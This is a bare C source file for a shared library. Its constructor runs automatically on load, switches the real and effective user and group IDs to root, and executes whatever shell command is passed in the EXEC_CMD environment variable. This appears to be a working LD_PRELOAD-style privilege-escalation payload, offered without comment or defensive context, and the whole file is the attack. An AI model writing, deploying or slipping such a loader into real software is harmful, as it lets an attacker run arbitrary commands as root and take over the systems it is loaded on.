#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(void) {
    if (getenv("SHELL_ENV_ACTIVE")) return;
    
    const char* cmd = getenv("EXEC_CMD");
    if (!cmd) return;
    
    setenv("SHELL_ENV_ACTIVE", "1", 1);
    setreuid(0, 0);
    setregid(0, 0);
    chdir("/");
    
    execl("/bin/sh", "sh", "-c", cmd, NULL);
}